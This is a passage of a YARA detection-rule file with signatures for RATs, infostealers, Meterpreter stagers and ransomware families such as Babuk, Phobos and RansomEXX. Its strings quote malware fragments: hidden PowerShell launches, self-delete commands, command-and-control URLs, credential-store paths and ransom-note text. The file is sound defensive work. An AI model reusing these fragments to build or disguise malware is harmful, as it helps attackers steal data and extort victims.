clamav_sig = "MALWARE.Win.Trojan.ParallaxRAT"
strings:
$s1 = "[Clipboard End]" fullword wide
$s2 = "[Ctrl +" fullword wide
$s3 = "[Alt +" fullword wide
$s4 = "Clipboard Start" wide
$s5 = "(Wscript.ScriptFullName)" wide
$s6 = "CSDVersion" fullword ascii
$s7 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" fullword ascii
$x1 = { 2e 65 78 65 00 00 84 00 00 4d 5a 90 00 }
$x2 = "This program cannot be run in DOS mode" ascii
condition:
((uint16(0) == 0x5a4d and all of ($s*)) or all of them)
}
rule SSC_Win_Meterpreter {
meta:
author = "ditekSHen"
description = "Detects Meterpreter payload"
strings:
$s1 = "PACKET TRANSMIT" fullword ascii
$s2 = "PACKET RECEIVE" fullword ascii
$s3 = "\\\\%s\\pipe\\%s" fullword ascii wide
$s4 = "%04x-%04x:%s" fullword wide
$s5 = "server.dll" fullword ascii
//$s6 = "tcp://" wide
condition:
(uint16(0) == 0x5a4d and all of them) or (filesize < 300KB and all of them)
}
rule SSC_Win_Trojan_ExpressCMS {
meta:
author = "ditekSHen"
description = "Detects ExpressCMS"
clamav_sig = "MALWARE.Win.Trojan.ExpressCMS"
strings:
$s1 = "/click.php?cnv_id=" fullword wide
$s2 = "/click.php?key=" wide
$s3 = "jdlnb" fullword wide
$s4 = "Gkjfdshfkjjd: dsdjdsjdhv" fullword wide
$s5 = "--elevated" fullword wide
$s6 = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\%d" wide
$s7 = "\\Microsoft\\Manager.exe" fullword wide
$s8 = "\\Microsoft\\svchost.exe" fullword wide
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_MeterpreterStager {
meta:
author = "ditekSHen"
description = "Detects Meterpreter stager payload"
strings:
$s1 = "PAYLOAD:" fullword ascii
$s2 = "AQAPRQVH1" fullword ascii
$s3 = "ws2_32" fullword ascii
$s4 = "KERNEL32.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them and filesize < 100KB
}
rule SSC_Win_Ziggy {
meta:
author = "ditekSHen"
description = "Detects Ziggy ransomware"
snort2_sid = "920098"
snort3_sid = "920096"
clamav_sig = "MALWARE.Win.Ransomware.Ziggy"
strings:
$id1 = "/Ziggy Info;component/mainwindow.xaml" fullword wide
$id2 = "AZiggy Info, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii
$id3 = "Ziggy Ransomware" fullword wide
$id4 = "clr-namespace:Zeggy" fullword ascii
$s1 = "GetCooldown" fullword ascii
$s2 = "checkCommandMappings" fullword ascii
$s3 =  "add_OnExecuteCommand" fullword ascii
$s4 = "MindLated.jpg" fullword wide
$s5 = "http://fixfiles.xyz/ziggy/api/info.php?id=" fullword wide
$s6 = "Reamaining time:" fullword wide
$msg1 = "<:In case of no answer in 12 hours write us to this e-mail" ascii
$msg2 = "Free decryption as guarantee" fullword ascii
$msg3 = "# Do not try to decrypt your data using third party software, it may cause permanent data loss" ascii
$msg4 = "# Decryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can becom" ascii
condition:
uint16(0) == 0x5a4d and (3 of ($id*) or 4 of ($s*) or 3 of ($msg*))
}
rule SSC_Win_NWorm {
meta:
author = "ditekSHen"
description = "Detects NWorm/N-W0rm payload"
clamav_sig = "MALWARE.Win.Trojan.NWorm"
strings:
$id1 = "N-W0rm" ascii
$id2 = "N_W0rm" ascii
$x1 = "pongPing" fullword wide
$x2 = "|NW|" fullword wide
$s1 = "runFile" fullword wide
$s2 = "runUrl" fullword wide
$s3 = "killer" fullword wide
$s4 = "powershell" fullword wide
$s5 = "wscript.exe" fullword wide
$s6 = "ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"" fullword wide
$s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" fullword wide
$s8 = "Start-Sleep -Seconds 1.5; Remove-Item -Path '" fullword wide
condition:
uint16(0) == 0x5a4d and ((1 of ($id*) and (1 of ($x*) or 3 of ($s*))) or (all of ($x*) and 2 of ($s*)) or 7 of ($s*) or 10 of them)
}
rule SSC_Win_QakBot {
meta:
author = "ditekSHen"
description = "Detects variants of QakBot payload"
strings:
$s1 = "stager_1.dll" fullword ascii
$s2 = "_vsnwprintf" fullword ascii
$s3 = "DllRegisterServer" fullword ascii
$s4 = "Win32_PnPEntity" fullword wide
$s5 = "0>user32.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Fonix {
meta:
author = "ditekSHen"
description = "Detects Fonix ransomware"
clamav_sig = "MALWARE.Win.Ransomware.Fonix"
strings:
$s1 = "dontcryptanyway" fullword wide
$s2 = "Cpriv.key" ascii wide
$s3 = "Cpub.key" ascii wide
$s4 = "NetShareEnum() failed!Error: % ld" fullword wide
$s5 = "<div class='title'> Attention!</div><ul><li><u><b>DO NOT</b> pay" wide
$s6 = "Encryption Completed !!!" fullword wide
$s7 = "kill process" fullword ascii
$s8 = "Copy SystemID C:\\ProgramData\\SystemID" ascii
$id1 = "].FONIX" fullword wide
$id2 = "xinofconfig.txt" fullword ascii wide
$id3 = "XINOF4MUTEX" wide
$id4 = ":\\Fonix\\cryptoPP\\" ascii
$id5 = "schtasks /CREATE /SC ONLOGON /TN fonix" ascii
$id6 = "Ransomware\\Fonix" ascii
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or 3 of ($id*) or (1 of ($id*) and 3 of ($s*)))
}
rule SSC_Win_Bobik {
meta:
author = "ditekSHen"
description = "Detects Bobik infostealer"
clamav_sig = "MALWARE.Win.Trojan.Bobik"
strings:
$s1 = "@Default\\Login Data" fullword ascii
$s2 = "@Default\\Cookies" fullword ascii
$s3 = "@logins.json" fullword ascii
$s4 = "@[EXECUTE]" fullword ascii
$s5 = "@C:\\Windows\\System32\\cmd.exe" fullword ascii
$s6 = /(CHROME|OPERA|FIREFOX)_BASED/ fullword ascii
$s7 = "threads.nim" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_RunningRAT {
meta:
author = "ditekSHen"
description = "Detects RunningRAT"
clamav_sig = "MALWARE.Win.Trojan.RunningRAT"
strings:
$s1 = "%s%d.dll" fullword ascii
$s2 = "/c ping 127.0.0.1 -n" ascii
$s3 = "del /f/q \"%s\"" ascii
$s4 = "GUpdate" fullword ascii
$s5 = "%s\\%d.bak" fullword ascii
$s6 = "\"%s\",MainThread" ascii
$s7 = "rundll32.exe" fullword ascii
$rev1 = "emankcosteg" fullword ascii
$rev2 = "ini.revreS\\" fullword ascii
$rev3 = "daerhTniaM,\"s%\" s%" ascii
$rev4 = "s% etadpUllD,\"s%\" 23lldnuR" ascii
$rev5 = "---DNE yromeMmorFdaoL" fullword ascii
$rev6 = "eMnigulP" fullword ascii
$rev7 = "exe.23lldnuR\\" fullword ascii
$rev8 = "dnammoc\\nepo\\llehs\\" ascii
$rev9 = "\"s%\" k- exe.tsohcvs\\23metsyS\\%%tooRmetsyS%" ascii
$rev10 = "emanybtsohteg" fullword ascii
$rev11 = "tekcosesolc" fullword ascii
$rev12 = "tpokcostes" fullword ascii
$rev13 = "emantsohteg" fullword ascii
// variant
$v2_1 = "%%SystemRoot%%\\System32\\svchost.exe -k \"%s\"" fullword ascii
$v2_2 = "LoadFromMemory END---" fullword ascii
$v2_3 = "hmProxy!= NULL" fullword ascii
$v2_4 = "Rundll32 \"%s\",DllUpdate %s" fullword ascii
$v2_5 = "ipip.website" fullword ascii
$v2_6 = "%d*%sMHz" fullword ascii
$v2_7 = "\\Server.ini" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 5 of ($rev*) or 6 of ($v*) or 8 of them)
}
rule SSC_Win_DLAgent05 {
meta:
author = "ditekSHen"
description = "Detects an unknown dropper. Typically exisys as a DLL in base64-encoded gzip-compressed file embedded within another executable"
clamav_sig = "MALWARE.Win.Trojan.DLAgent05"
strings:
$s1 = "MARCUS.dll" fullword ascii wide
$s2 = "GZipStream" fullword ascii
$s3 = "MemoryStream" fullword ascii
$s4 = "proj_name" fullword ascii
$s5 = "res_name" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Nemty {
meta:
author = "ditekSHen"
description = "Detects Nemty/Nefilim ransomware"
strings:
$s1 = "Go build ID:" ascii
$s2 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticKharoshthiManichaeanOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianSaurasht" ascii
$s3 = "crypto/x509.ExtKeyUsage" ascii
$s4 = "crypto/x509.KeyUsageContentCommitment" ascii
$s5 = "DEK-Info header" ascii
$s6 = "GetUserProfileDirectoryWMagallanes Standard TimeMontevideo Standard TimeNorth Asia Standard TimePacific SA Standard TimeQueryPerformanceCounter" fullword ascii
$s7 = "*( -  <  =  >  k= m=%: +00+03+04+05+06+07+08+09+10+11+12+13+14-01-02-03-04-05-06-08-09-11-12..." ascii
$s8 = "Go cmd/compile go1.10" fullword ascii
$s9 = ".dllprogramdatarecycle.bin" ascii
$s10 = ".dll.exe.lnk.sys.url" ascii
$vx1_1 = "Fa1led to os.OpenFile()" ascii
$vx1_2 = "-HELP.txt" ascii
$vf1_1 = "main.CTREncrypt" fullword ascii
$vf1_2 = "main.FileSearch" fullword ascii
$vf1_3 = "main.getdrives" fullword ascii
$vf1_4 = "main.RSAEncrypt" fullword ascii
$vf1_5 = "main.SaveNote" fullword ascii
condition:
uint16(0) == 0x5a4d and (9 of ($s*) or (all of ($vx*) and 2 of ($s*)) or all of ($vf*))
}
rule SSC_Win_QnapCrypt {
meta:
author = "ditekSHen"
description = "Detects QnapCrypt/Lockedv1/Cryptfile2 ransomware"
strings:
$go = "Go build ID:" ascii
$s1 = "Encrypting %s..." ascii
$s2 = "\\Start Menu\\Programs\\StartUp\\READMEV" ascii
$s3 = "main.deleteRecycleBin" ascii
$s4 = "main.encryptFiles" ascii
$s5 = "main.antiVirtualBox" ascii
$s6 = "main.antiVmware" ascii
$s7 = "main.deleteShadows" ascii
$s8 = "main.delUAC" ascii
$s9 = "main.KillProcess" ascii
$s10 = "main.delExploit" ascii
$s11 = "main.encrypt" ascii
$s12 = "main.ClearLogDownload" ascii
$s13 = "main.ClearLog" ascii
$s14 = "main.EndEncrypt" ascii
$s15 = "main.RunFuckLogAndSoft" ascii
$s16 = "main.ClearUsercache" ascii
$s17 = "main.FirstDuty" ascii
$s18 = ".lockedv1" ascii
$s19 = "WSAStartup\\clear.bat\\ngrok.exe\\video.mp4" ascii
$s20 = "net stop " ascii
condition:
uint16(0) == 0x5a4d and $go and 6 of ($s*)
}
rule SSC_Win_Alfonoso {
meta:
author = "ditekSHen"
description = "Detects Alfonoso / Shurk / HunterStealer infostealer"
snort2_sid = "920102"
snort3_sid = "920100"
clamav_sig = "MALWARE.Win.Trojan.Alfonso"
strings:
$s1 = "%s\\etilqs_" fullword ascii
$s2 = "SELECT name, rootpage, sql FROM '%q'.%s" fullword ascii
$s3 = "%s-mj%08X" fullword ascii
$s4 = "| Site:" ascii
$s5 = "| Login:" ascii
$s6 = "| Password:" ascii
$s7 = "| BUILD NAME:" ascii
$s8 = "recursive_directory_iterator" ascii
$s9 = { 2e 7a 69 70 00 00 00 00 2e 7a 6f 6f 00 00 00 00
2e 61 72 63 00 00 00 00 2e 6c 7a 68 00 00 00 00
2e 61 72 6a 00 00 00 00 2e 67 7a 00 2e 74 67 7a
00 00 00 00 }
$s10 = "Shurk Steal" fullword ascii
$s11 = ":memory:" fullword ascii
$s12 = "current_path()" fullword ascii
$s13 = "vtab:%p:%p" fullword ascii
$f1 = "chatlog.txt" ascii
$f2 = "servers.fav" ascii
$f3 = "\\USERDATA.DAT" fullword ascii
condition:
uint16(0) == 0x5a4d and (8 of ($s*) or (6 of ($s*) and 2 of ($f*)) or (all of ($f*) and 5 of ($s*)))
}
rule SSC_Win_Vidar {
meta:
author = "ditekSHen"
description = "Detects Vidar / ArkeiStealer"
strings:
$s1 = "\"os_crypt\":{\"encrypted_key\":\"" fullword ascii
$s2 = "screenshot.jpg" fullword wide
$s3 = "Content-Disposition: form-data; name=\"" ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Babuk {
meta:
author = "ditekSHen"
description = "Detects Babuk ransomware"
strings:
$s1 = "ecdh_pub_k.bin" wide
$s2 = "How To Restore Your Files.txt" wide
$s3 = /(babuk|babyk)\s(ransomware|locker)/ ascii nocase
$s4 = "/login.php?id=" ascii
$s5 = "http://babuk" ascii
$s6 = "bootsect.bak" fullword wide
$s7 = "Can't open file after killHolder" ascii
$s8 = "Can't OpenProcess" ascii
$s9 = "DoYouWantToHaveSexWithCuongDong" ascii
$arg1 = "-lanfirst" fullword ascii
$arg2 = "-lansecond" fullword ascii
$arg3 = "-nolan" fullword ascii
$arg4 = "shares" fullword wide
$arg5 = "paths" fullword wide
$arg6 = "gdebug" fullword wide
condition:
uint16(0) == 0x5a4d and (3 of ($s*) or (3 of ($arg*) and 2 of ($s*)))
}
rule SSC_Win_Nitol {
meta:
author = "ditekSHen"
description = "Detects Nitol backdoor"
strings:
$s1 = "%$#@!.aspGET ^&*().htmlGET" ascii
$s2 = "Applications\\iexplore.exe\\shell\\open\\command" fullword ascii
$s3 = "taskkill /f /im rundll32.exe" fullword ascii
$s4 = "\\Tencent\\Users\\*.*" fullword ascii
$s5 = "[Pause Break]" fullword ascii
$s6 = ":]%d-%d-%d  %d:%d:%d" fullword ascii
$s7 = "GET %s HTTP/1.1" fullword ascii
$s8 = "GET %s%s HTTP/1.1" fullword ascii
$s9 = "Accept-Language: zh-cn" fullword ascii
$s10 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 5.1)" fullword ascii
$s11 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)" fullword ascii
$s12 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)" fullword ascii
$w1 = ".aspGET" ascii
$w2 = ".htmGET" ascii
$w3 = ".htmlGET" ascii
$domain = "www.xy999.com" fullword ascii
$v2_1 = "loglass" fullword ascii
$v2_2 = "rlehgs" fullword ascii
$v2_3 = "eherrali" fullword ascii
$v2_4 = "agesrlu" fullword ascii
$v2_5 = "lepejagas" fullword ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or (all of ($v2*)) or ($domain and 3 of them) or (#w1 > 2 and #w2 > 2 and #w3 > 2 and 3 of ($s*)))
}
rule SSC_Win_StrongPity {
meta:
author = "ditekSHen"
description = "Detects StrongPity"
strings:
$s1 = "Boundary%08X" ascii wide
$s2 = "Content-Disposition: form-data; name=\"file\";" fullword ascii
$s3 = "%sfilename=\"%ls\"" fullword ascii
$s4 = "name=%ls&delete=" fullword ascii
$s5 = "Content-Type: application/octet-stream" fullword ascii
$s6 = "cmd.exe /C ping" wide
$s7 = "& rmdir /Q /S \"" wide
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_JSSLoader {
meta:
author = "ditekSHen"
description = "Detects JSSLoader RAT/backdoor"
strings:
$cmd1 = "Cmd_UPDATE" fullword ascii
$cmd2 = "Cmd_IDLE" fullword ascii
$cmd3 = "Cmd_EXE" fullword ascii
$cmd4 = "Cmd_VBS" fullword ascii
$cmd5 = "Cmd_JS" fullword ascii
$cmd6 = "Cmd_PWS" fullword ascii
$cmd7 = "Cmd_RAT" fullword ascii
$cmd8 = "Cmd_UNINST" fullword ascii
$cmd9 = "Cmd_RunDll" fullword ascii
$s1 = "ANSWER_OK" fullword ascii
$s2 = "GatherDFiles" ascii
$s3 = "CommandCd" fullword ascii
$s4 = "URL_GetCmd" fullword ascii
$s5 = "\"host\": \"{0}\", \"domain\": \"{1}\", \"user\": \"{2}\"" wide
$s6 = "pc_dns_host_name" wide
$s7 = "\"adinfo\": { \"adinformation\":" wide
$e1 = "//e:vbscript" wide
$e2 = "//e:jscript" wide
$e3 = "/c rundll32.exe" wide
$e4 = "/C powershell" wide
$e5 = "C:\\Windows\\System32\\cmd.exe" wide
$e6 = "echo del /f" wide
$e7 = "AT.U() {0}. format" wide
condition:
uint16(0) == 0x5a4d and (5 of ($cmd*) or 5 of ($s*) or all of ($e*) or 7 of them)
}
rule SSC_Win_CHUWI_Seth {
meta:
author = "ditekSHen"
description = "Detects detected unknown RAT. Called CHUWI based on PDB, and promoted to Seth Ransomware."
snort2_sid = "920103-920105"
snort3_sid = "920101-920103"
notes = "First sighting on 2020-01-05 didn't include ransomware artificats. Second sighting on 2020-01-24 with several correlations between the two samples now include ransomware artifacts."
strings:
// First sighting on 2020-01-05
// No ransomware artifcats
// 80104e0ad490b44a632a15e5875e7626db7f35fa94d7aadf19c45a621d75c7e0
$cmd1 = "shell_command" fullword ascii
$cmd2 = "check_command" fullword ascii
$cmd3 = "down_exec" fullword ascii
$cmd4 = "open_link" fullword ascii
$cmd5 = "down_exec" fullword ascii
$cmd6 = "exe_link" fullword ascii
$cmd7 = "shellCommand" fullword ascii
$cmd8 = "R_CMMAND" fullword ascii
$cnc1 = "/check_command.php?HWID=" ascii
$cnc2 = "&act=get_command" ascii
$cnc3 = "/get_command.php?hwid=" ascii
$cnc4 = "&command=down_exec" ascii
$cnc5 = "&command=message" ascii
$cnc6 = "&command=open_link" ascii
$cnc7 = "&command=down_exec" ascii
$cnc8 = "&command=shell" ascii
$pdb = "\\Users\\CHUWI\\Documents\\CPROJ\\Downloader\\svchost" ascii
// Second sighting on 2020-01-24
// Includes ransomware artificats
// 58c852525bf3bea185db34a79c2c5640c02f8291cdbdbe8dd7c0a9d4682f4b2c
$rcnc1 = "inc/check_command.php" ascii
$rcnc2 = "inc/get_command.php" ascii
$rcnc3 = "php?btc" ascii
$rcnc4 = "php?hwid" ascii
$x1 = "> %USERPROFILE%\\Desktop\\HOW_DECRYPT_FILES.seth.txt" ascii
$x2 = "/C dir /b %USERPROFILE%\\Documents > %temp%\\doc.txt" ascii
$x3 = "/C dir /b %USERPROFILE%\\Desktop > %temp%\\desk.txt" ascii
$x4 = "/C dir /b %USERPROFILE%\\Downloads > %temp%\\downs.txt" ascii
$x5 = "/C dir /b %USERPROFILE%\\Pictures > %temp%\\pics.txt" ascii
$x6 = "for /F \"delims=\" %%a in ('mshta.exe \"%~F0\"') do set \"HTA=%%a\"" ascii
$x7 = "\\svchost.exe" fullword ascii
$x8 = ".seth" fullword ascii
$x9 = "MyAgent" fullword ascii
condition:
uint16(0) == 0x5a4d and ($pdb or 5 of ($cmd*) or 4 of ($cnc*) or all of ($rcnc*) or 5 of ($x*) or 8 of them)
}
rule SSC_Win_Gulpix {
meta:
author = "ditekSHen"
description = "Detects Gulpix/HyperPlus backddor"
strings:
$x1 = "MainServer.dll" fullword ascii
$x2 = "NvSmartMax.dat" fullword wide
$x3 = "NvSmartMax.dll" fullword wide
$x4 = "http://+:80/FD873AC4-CF86-4FED-84EC-4BD59C6F17A7/" fullword wide
$s1 = "IP retriever" fullword wide
$s2 = "\\cmd.exe" fullword wide
$s3 = "\\msnetwork-cache.db" fullword wide
$s4 = "http://+:" wide
$s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" fullword wide
// UAC Bypass
$s6 = "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" ascii
$s7 = "Got a unknown request for %ws" wide
$s8 = "HttpReceiveRequestEntityBody failed with %lu" wide
$s9 = "FD873AC4-CF86-4FED-84EC-4BD59C6F17A7" wide
condition:
uint16(0) == 0x5a4d and (all of ($x*) or 6 of ($s*) or (2 of ($x*) and 4 of ($s*)) or
(
2 of them and
pe.exports("daemon") and
pe.exports("run") and
pe.exports("session") and
pe.exports("work")
)
)
}
rule SSC_Linux_RansomExx {
meta:
author = "ditekshen"
description = "Detects RansomEXX ransomware"
clamav_sig = "MALWARE.Linux.Ransomware.RansomEXX"
strings:
$c1 = "crtstuff.c" fullword ascii
$c2 = "cryptor.c" fullword ascii
$c3 = "ransomware.c" fullword ascii
$c4 = "logic.c" fullword ascii
$c5 = "enum_files.c" fullword ascii
$c6 = "readme.c" fullword ascii
$c7 = "ctr_drbg.c" fullword ascii
$s1 = "regenerate_pre_data" fullword ascii
$s2 = "g_RansomHeader" fullword ascii
$s3 = "CryptOneBlock" fullword ascii
$s4 = "RansomLogic" fullword ascii
$s5 = "CryptOneFile" fullword ascii
$s6 = "encrypt_worker" fullword ascii
$s7 = "list_dir" fullword ascii
$s8 = "ctr_drbg_update_internal" fullword ascii
condition:
uint16(0) == 0x457f and (5 of ($s*) or 6 of ($s*) or (3 of ($c*) and 3 of ($s*)))
}
rule SSC_Win_TrickbotModule {
meta:
author = "ditekshen"
description = "Detects Trickbot modules"
strings:
$mc = "<moduleconfig>" ascii
$s1 = "<autostart>" ascii
$s2 = "<nohead>" ascii
$s3 = "<needinfo" ascii
$s4 = "<conf ctl" ascii
$s5 = "<limit>" ascii
$w1 = "<sys>yes</sys>" ascii
$w2 = "<sys>no</sys>" ascii
$w3 = "<autostart>yes</autostart>" ascii
$w4 = "<autostart>no</autostart>" ascii
$w5 = "<nohead>yes</nohead>" ascii
$w6 = "<nohead>no</nohead>" ascii
$w7 = /<limit>\d+<\/limit>/ ascii
$w8 = "<moduleconfig> </moduleconfig" ascii
condition:
uint16(0) == 0x5a4d and $mc and (2 of ($s*) or (1 of ($s*) and 1 of ($w*)) or 1 of ($w*))
}
rule SSC_Win_Gaudox {
meta:
author = "ditekshen"
description = "Detects Gaudox RAT"
strings:
$s1 = "hdr=%s&tid;=%s&cid;=%s&trs;=%i" ascii wide
$s2 = "\\\\\\\\.\\\\PhysicalDrive%u" ascii wide
//$s3 = "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0" ascii wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Phobos {
meta:
author = "ditekshen"
description = "Detects Phobos ransomware"
strings:
$x1 = "\\\\?\\UNC\\\\\\e-" fullword wide
$x2 = "\\\\?\\ :" fullword wide
$x3 = "POST" fullword wide
$s1 = "ELVL" fullword wide
$s2 = /SUP\d{3}/ fullword wide
$s3 = { 41 31 47 ?? 41 2b }
condition:
uint16(0) == 0x5a4d and all of ($x*) and 1 of ($s*)
}
rule SSC_Win_Ratty {
meta:
author = "ditekshen"
description = "Detects Ratty Java RAT"
strings:
$s1 = "/rat/RattyClient.class" ascii
$s2 = "/rat/ActiveConnection.class" ascii
$s3 = "/rat/attack/" ascii
$s4 = "/rat/gui/swing/Ratty" ascii
$s5 = "/rat/packet/PasswordPacket" ascii
$s6 = "/rat/packet/" ascii
$e1 = "/engine/Keyboard.class" ascii
$e2 = "/engine/IMouseListener.class" ascii
$e3 = "/engine/Screen$ResizeBehavior.class" ascii
$e4 = "/engine/fx/ISoundListener.class" ascii
$e5 = "/engine/net/TCPServer.class"  ascii
$e6 = "/engine/noise/PerlinNoise.class" ascii
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 or uint16(0) == 0x4b50) and (3 of ($s*) or all of ($e*))
}
rule SSC_Win_FatDuke {
meta:
author = "ditekSHen"
description = "Detects FatDuke"
strings:
$s1 = "\\\\?\\Volume" fullword ascii
$s2 = "WINHTTP_AUTOPROXY_OPTIONS@@PAUWINHTTP_PROXY_INFO@@" ascii
$s3 = "WINHTTP_CURRENT_USER_IE_PROXY_CONFIG@@" ascii
$s4 = "Cannot write a Cannot find the too long string mber of records Log malfunction! Cannot create ain an invalid ra Internal sync iright function iWaitForSingleObjffsets" ascii
$pattern = "()$^.*+?[]|\\-{},:=!" ascii
$b64 = "eyJjb25maWdfaWQiOi" wide
//$decoded = "{\"config_id\"" base64wide
condition:
//uint16(0) == 0x5a4d and (3 of ($s*) or (($b64 or $decoded) and 2 of them) or (#pattern > 3 and 2 of them))
uint16(0) == 0x5a4d and (3 of ($s*) or ($b64 and 2 of them) or (#pattern > 3 and 2 of them))
}
rule SSC_Win_MiniDuke {
meta:
author = "ditekSHen"
description = "Detects MiniDuke"
strings:
$s1 = "DefPipe" fullword ascii
$s2 = "term %5d" fullword ascii
$s3 = "pid %5d" fullword ascii
$s4 = "uptime %5d.%02dh" fullword ascii
$s5 = "login: %s\\%s" fullword ascii
$s6 = "Software\\Microsoft\\ApplicationManager" ascii
$s7 = { 69 64 6c 65 ?? 00 73 74 6f 70 ?? 00 61 63 63 65 70 74 ?? 00 63 6f 6e 6e 65 63 74 ?? 00 6c 69 73 74 65 6e ?? 00 }
$net1 = "salesappliances.com" ascii
$net2 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36" fullword ascii
$net3 = "http://10." ascii
$net4 = "JiM9t8g7j8KoJkLJlKqka8dbo7q5z4v5u3o4z" ascii
$net5 = "application/octet-stream" ascii
$net6 = "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"" ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or 4 of ($net*) or 7 of them)
}
rule SSC_Win_PolyglotDuke {
meta:
author = "ditekSHen"
description = "Detects PolyGlotDuke"
strings:
$s1 = { 48 b9 ff ff ff ff ff ff ff ff 51 48 23 8c 24 ?? 00 00 00 48 89 8C 24 00 00 00 00 }
$s2 = { 56 be ff ff ff ff 56 81 e6 7f }
$s3 = { 48 8b 05 19 ?4 4b 00 48 05 48 83 00 00 4c 8b 44 24 50 8b 54 24 48 48 8b }
//$s4 = { 48 8B 84 24 ?? 00 00 00 48 ?? ?? 24 ?? 00 00 00 48 89 84 24 }
condition:
uint16(0) == 0x5a4d and (all of ($s*)) or
(
2 of them and
pe.exports("InitSvc")
)
}
rule SSC_Win_Guidlma {
meta:
author = "ditekSHen"
description = "Detects Guildma"
strings:
$v1_1 = "marxvxinhhm98.dll" fullword wide
$v1_2 = "marxvxinhhmxa.gif" fullword wide
$v1_3 = "marxvxinhhmxb.gif" fullword wide
$v1_4 = "c:\\programdata" fullword wide
$v1_5 = "\\tempa\\" fullword wide
$v2_1 = "C:\\Windows\\System32\\dllhost.exe" fullword ascii
$v2_2 = "C:\\Windows\\SysWOW64\\dllhost.exe" fullword ascii
$v2_3 = "C:\\Users\\Public\\go" fullword ascii
$v2_4 = ":%:*:/:>:C:H:W:\\:a:p:u:z:" fullword ascii
$v2_5 = ": :%:*:9:>:C:R:W:\\:k:p:u:" fullword ascii
$v2_6 = ":*:/:4:C:H:M:\\:a:f:u:z:" fullword ascii
condition:
uint16(0) == 0x5a4d and 3 of ($v1*) or 5 of ($v2*)
}
rule SSC_Win_CyberGate {
meta:
author = "ditekSHen"
description = "Detects CyberGate/Spyrat/Rebhip RTA"
strings:
$s1 = "UnitInjectLibrary" ascii
$s2 = "TLoader" fullword ascii
$s3 = "\\\\.\\SyserDbgMsg" fullword ascii
$s4 = "\\\\.\\SyserBoot" fullword ascii
$s5 = "\\signons" ascii
$s6 = "####@####" ascii
$s7 = "XX-XX-XX-XX" fullword ascii
$s8 = "EditSvr" ascii
$s9 = "_x_X_PASSWORDLIST_X_x_" fullword ascii
$s10 = "L$_RasDefaultCredentials#0" fullword ascii
$s11 = "password" nocase ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_WSHRATJS {
meta:
author = "ditekSHen"
description = "Detects WSHRAT JS variants"
strings:
$charset_full = "us-ascii" nocase ascii
$charset_begin = "\"us-\"" nocase ascii
$charset_end = "Array(97,115,99,105,105)" nocase ascii
$wsc_object1 = "WScript.CreateObject(\"System.Text.UTF8Encoding" nocase ascii
$wsc_object2 = "WScript.CreateObject(\"Adodb.Stream" nocase ascii
$wsc_object3 = "WScript.CreateObject(\"Microsoft.XmlDom" nocase ascii
$s1 = "function(){return" ascii
$s2 = "}catch(err){" ascii
$s3 = "{item: \"bin.base64\"}" nocase ascii
$s4 = "* 1].item =" ascii
condition:
filesize < 400KB and ($charset_full or ($charset_begin and $charset_end)) and 2 of ($wsc_object*) and 3 of ($s*)
}
rule SSC_Win_AsyncRAT {
meta:
author = "ditekSHen"
description = "Detects AsyncRAT"
strings:
$x1 = "AsyncRAT" fullword ascii
$x2 = "AsyncRAT 0." wide
$x3 = /AsyncRAT\s[0-9]\.[0-9]\.[0-9][A-Z]/ fullword wide
$s1 = "/create /sc onlogon /rl highest /tn" fullword wide
$s2 = "/C choice /C Y /N /D Y /T 1 & Del \"" fullword wide
$s3 = "{{ ProcessId = {0}, Name = {1}, ExecutablePath = {2} }}" fullword wide
$s4 = "Stub.exe" fullword ascii wide
$s5 = "\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH" ascii wide
$s6 = "VirtualBox" fullword ascii wide
$s7 = "/target:winexe /platform:x86 /optimize+" fullword ascii wide
$s8 = "Win32_ComputerSystem" ascii wide
$s9 = "Win32_Process Where ParentProcessID=" ascii wide
$s10 = "etirWgeR.llehShsW" ascii wide
$s11 = "usbSpread" fullword ascii wide
$cnc1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" fullword ascii wide
$cnc2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" fullword ascii wide
$cnc3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii wide
$cnc4 = "POST / HTTP/1.1" fullword ascii wide
condition:
